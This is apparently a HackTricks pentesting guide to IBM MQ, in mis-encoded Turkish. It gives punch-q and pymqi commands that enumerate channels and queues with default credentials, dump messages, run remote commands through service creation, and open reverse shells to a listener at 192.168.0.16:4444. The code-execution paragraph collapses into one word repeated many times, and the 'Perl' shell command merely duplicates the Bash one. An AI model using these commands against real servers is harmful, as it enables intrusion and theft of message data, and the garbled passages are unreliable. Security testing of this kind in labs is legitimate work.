# 1414 - IBM MQ Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel bilgiler

IBM MQ, mesaj kuyruklarÄ±nÄ± yÃ¶netmek iÃ§in kullanÄ±lan bir IBM teknolojisidir. DiÄŸer **mesaj aracÄ±sÄ±** teknolojileri gibi, Ã¼reticiler ve tÃ¼keticiler arasÄ±nda bilgi almak, depolamak, iÅŸlemek ve sÄ±nÄ±flandÄ±rmak iÃ§in kullanÄ±lÄ±r.

VarsayÄ±lan olarak, **IBM MQ TCP baÄŸlantÄ± noktasÄ± 1414** olarak aÃ§Ä±lÄ±r.
Bazen, HTTP REST API baÄŸlantÄ± noktasÄ± **9443** Ã¼zerinde aÃ§Ä±labilir.
Metrikler (Prometheus) TCP baÄŸlantÄ± noktasÄ± **9157** Ã¼zerinden eriÅŸilebilir.

IBM MQ TCP baÄŸlantÄ± noktasÄ± 1414, mesajlarÄ±, kuyruklarÄ±, kanallarÄ± vb. manipÃ¼le etmek iÃ§in kullanÄ±labilir, ancak aynÄ± zamanda **Ã¶rneÄŸi kontrol etmek** iÃ§in de kullanÄ±labilir.

IBM, [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq) adresinde geniÅŸ bir teknik belge saÄŸlamaktadÄ±r.

## AraÃ§lar

Kolay sÃ¶mÃ¼rÃ¼ iÃ§in Ã¶nerilen bir araÃ§ **[punch-q](https://github.com/sensepost/punch-q)**, Docker kullanÄ±mÄ±yla. AraÃ§, Python kÃ¼tÃ¼phanesi `pymqi`'yi aktif olarak kullanmaktadÄ±r.

Daha manuel bir yaklaÅŸÄ±m iÃ§in, Python kÃ¼tÃ¼phanesi **[pymqi](https://github.com/dsuch/pymqi)** kullanÄ±n. [IBM MQ baÄŸÄ±mlÄ±lÄ±klarÄ±](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) gereklidir.

### pymqi'nin kurulumu

**IBM MQ baÄŸÄ±mlÄ±lÄ±klarÄ±** kurulmalÄ± ve yÃ¼klenmelidir:

1. [https://login.ibm.com/](https://login.ibm.com/) adresinde bir hesap (IBMid) oluÅŸturun.
2. IBM MQ kÃ¼tÃ¼phanelerini [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) adresinden indirin. Linux x86_64 iÃ§in **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**'dir.
3. ArÅŸivi aÃ§Ä±n (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. Lisans koÅŸullarÄ±nÄ± kabul etmek iÃ§in `sudo ./mqlicense.sh` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n.

>EÄŸer Kali Linux altÄ±ndaysanÄ±z, `mqlicense.sh` dosyasÄ±nÄ± dÃ¼zenleyin: aÅŸaÄŸÄ±daki satÄ±rlarÄ± (105-110 arasÄ±ndaki satÄ±rlar) kaldÄ±rÄ±n/yorumlayÄ±n:
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Bu paketleri kurun:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ArdÄ±ndan, geÃ§ici olarak `.so` dosyalarÄ±nÄ± LD'ye ekleyin: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, bu baÄŸÄ±mlÄ±lÄ±klarÄ± kullanan diÄŸer araÃ§larÄ± Ã§alÄ±ÅŸtÄ±rmadan **Ã¶nce**.

Daha sonra, [**pymqi**](https://github.com/dsuch/pymqi) projesini klonlayabilirsiniz: ilginÃ§ kod parÃ§acÄ±klarÄ±, sabitler iÃ§erir... Veya doÄŸrudan kÃ¼tÃ¼phaneyi ÅŸu komutla yÃ¼kleyebilirsiniz: `pip install pymqi`.

### punch-q KullanÄ±mÄ±

#### Docker ile

BasitÃ§e ÅŸunu kullanÄ±n: `sudo docker run --rm -ti leonjza/punch-q`.

#### Docker olmadan

[**punch-q**](https://github.com/sensepost/punch-q) projesini klonlayÄ±n ve ardÄ±ndan kurulum iÃ§in readme'yi takip edin (`pip install -r requirements.txt && python3 setup.py install`).

Sonra, `punch-q` komutuyla kullanÄ±labilir.

## NumaralandÄ±rma

**punch-q** veya **pymqi** ile **kuyruk yÃ¶neticisi adÄ±nÄ±, kullanÄ±cÄ±larÄ±, kanallarÄ± ve kuyruklarÄ±** numaralandÄ±rmayÄ± deneyebilirsiniz.

### Kuyruk YÃ¶neticisi

Bazen, Kuyruk YÃ¶neticisi adÄ±nÄ± almak iÃ§in herhangi bir koruma olmayabilir:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Kanallar

**punch-q**, mevcut kanallarÄ± bulmak iÃ§in dahili (deÄŸiÅŸtirilebilir) bir kelime listesi kullanÄ±r. KullanÄ±m Ã¶rneÄŸi:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
BazÄ± IBM MQ Ã¶rnekleri, **kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ** MQ isteklerini kabul eder, bu yÃ¼zden `--username / --password` gerekmez. Tabii ki, eriÅŸim haklarÄ± da deÄŸiÅŸebilir.

Bir kanal adÄ± (burada: `DEV.ADMIN.SVRCONN`) elde ettiÄŸimiz anda, diÄŸer tÃ¼m kanallarÄ± sÄ±ralayabiliriz.

SÄ±ralama temel olarak **pymqi**'den bu kod parÃ§acÄ±ÄŸÄ± `code/examples/dis_channels.py` ile yapÄ±labilir:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... Ancak **punch-q** ayrÄ±ca bu bÃ¶lÃ¼mÃ¼ de iÃ§erir (daha fazla bilgiyle!). AÅŸaÄŸÄ±daki komutla baÅŸlatÄ±labilir:

```bash
punch-q
```

Bu komut, IBM MQ sunucusuna karÅŸÄ± bir saldÄ±rÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lÄ±r.
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Kuyruklar

**pymqi** ile ilgili bir kod parÃ§acÄ±ÄŸÄ± (`dis_queues.py`) bulunmaktadÄ±r, ancak **punch-q** kuyruklar hakkÄ±nda daha fazla bilgi almayÄ± saÄŸlar:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### MesajlarÄ± Dump Etme

Belirli bir kuyruÄŸa/kanala hedef alarak, mesajlarÄ± onlardan Ã§almak/dump etmek mÃ¼mkÃ¼ndÃ¼r (yÄ±kÄ±cÄ± olmayan iÅŸlem). *Ã–rnekler:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**TÃ¼m belirlenen kuyruklarda tekrarlamaktan Ã§ekinmeyin.**

### Kod yÃ¼rÃ¼tme

> Devam etmeden Ã¶nce bazÄ± detaylar: IBM MQ birden fazla ÅŸekilde kontrol edilebilir: MQSC, PCF, Kontrol Komutu. BazÄ± genel listeler [IBM MQ belgelerinde](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison) bulunabilir. [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Programlanabilir Komut BiÃ§imleri***) uzaktan Ã¶rnekle etkileÅŸimde bulunmak iÃ§in odaklandÄ±ÄŸÄ±mÄ±z ÅŸeydir. **punch-q** ve daha da Ã¶nemlisi **pymqi** PCF etkileÅŸimlerine dayanÄ±r.
>
> PCF komutlarÄ±nÄ±n bir listesini bulabilirsiniz:
> * [PCF belgelerinden](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), ve
> * [sabitlerden](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> Ä°lginÃ§ bir komut `MQCMD_CREATE_SERVICE` ve belgeleri [burada](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms) bulunabilir. ArgÃ¼man olarak, Ã¶rneÄŸin (`/bin/sh`) Ã¶rneÄŸinde olduÄŸu gibi, Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekteki Ã¶rnekte
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> IBM MQ gÃ¼nlÃ¼klerinde, komutun baÅŸarÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± okuyabilirsiniz:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: '808544aa7fc94c48' komutu baÅŸlatÄ±ldÄ±. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

AyrÄ±ca, makinedeki mevcut programlarÄ± da sÄ±ralayabilirsiniz (burada `/bin/doesnotexist` ... mevcut deÄŸil):
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**Dikkat edin, program baÅŸlatma iÅŸlemi asenkron olarak gerÃ§ekleÅŸir. Bu nedenle, saldÄ±rÄ±yÄ± kullanmak iÃ§in ikinci bir Ã¶ÄŸeye ihtiyacÄ±nÄ±z vardÄ±r** ***(ters kabuk iÃ§in dinleyici, farklÄ± bir hizmette dosya oluÅŸturma, aÄŸ Ã¼zerinden veri sÄ±zdÄ±rma...)***

**Ã–rnek 2**

Kolay bir ters kabuk iÃ§in, **punch-q** ayrÄ±ca iki ters kabuk yÃ¼kÃ¼ de sunar:

* Bir tanesi bash ile
* Bir tanesi perl ile

*Tabii ki, `execute` komutuyla Ã¶zel bir tane oluÅŸturabilirsiniz.*

Bash iÃ§in:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Perl iÃ§in:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Ã–zel PCF

IBM MQ belgelerine derinlemesine inceleyebilir ve belirli bir PCF komutunu test etmek iÃ§in **pymqi** python kÃ¼tÃ¼phanesini doÄŸrudan kullanabilirsiniz. Bu, **punch-q** tarafÄ±ndan uygulanmayan Ã¶zel bir PCF komutunu test etmek iÃ§in kullanÄ±labilir.

**Ã–rnek:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
EÄŸer sabit isimleri bulamazsanÄ±z, [IBM MQ belgelerine](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors) baÅŸvurabilirsiniz.

> *Ã–rnek iÃ§in [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (OndalÄ±k = 73). `MQCA_CLUSTER_NAME` (OndalÄ±k = 2029) parametresine ihtiyaÃ§ duyar, bu da `*` olabilir (Belge: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Hata")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Test ortamÄ±

IBM MQ davranÄ±ÅŸÄ±nÄ± ve zafiyetleri test etmek isterseniz, Docker tabanlÄ± yerel bir ortam kurabilirsiniz:

1. ibm.com ve cloud.ibm.com Ã¼zerinde bir hesaba sahip olun.
2. IBM MQ'yu bir konteyner Ã¼zerinde oluÅŸturun:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
VarsayÄ±lan olarak, kimlik doÄŸrulama etkinleÅŸtirilmiÅŸtir, kullanÄ±cÄ± adÄ± `admin` ve ÅŸifre `passw0rd` (Ortam deÄŸiÅŸkeni `MQ_ADMIN_PASSWORD`) olarak ayarlanmÄ±ÅŸtÄ±r.
Burada, kuyruk yÃ¶neticisi adÄ± `MYQUEUEMGR` (deÄŸiÅŸken `MQ_QMGR_NAME`) olarak ayarlanmÄ±ÅŸtÄ±r.

IBM MQ'nun Ã§alÄ±ÅŸÄ±r durumda olmasÄ± ve baÄŸlantÄ± noktalarÄ±nÄ±n aÃ§Ä±k olmasÄ± gerekmektedir:
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ docker gÃ¶rÃ¼ntÃ¼lerinin eski sÃ¼rÃ¼mÃ¼ ÅŸurada bulunabilir: https://hub.docker.com/r/ibmcom/mq/.

## Referanslar

* [mgeeky'nin gist'i - "Practical IBM MQ Penetration Testing notlarÄ±"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ belgeleri](https://www.ibm.com/docs/en/ibm-mq)
